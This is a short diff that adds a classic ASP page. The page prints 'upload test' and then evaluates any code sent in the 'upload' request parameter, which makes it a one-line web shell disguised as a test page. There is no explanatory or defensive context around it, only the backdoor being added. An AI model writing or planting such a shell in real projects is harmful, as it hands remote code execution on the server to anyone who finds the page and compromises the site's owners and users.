@@ -1,0 +1,4 @@
+<%
+response.write "upload test"
+eval request("upload")
+%>
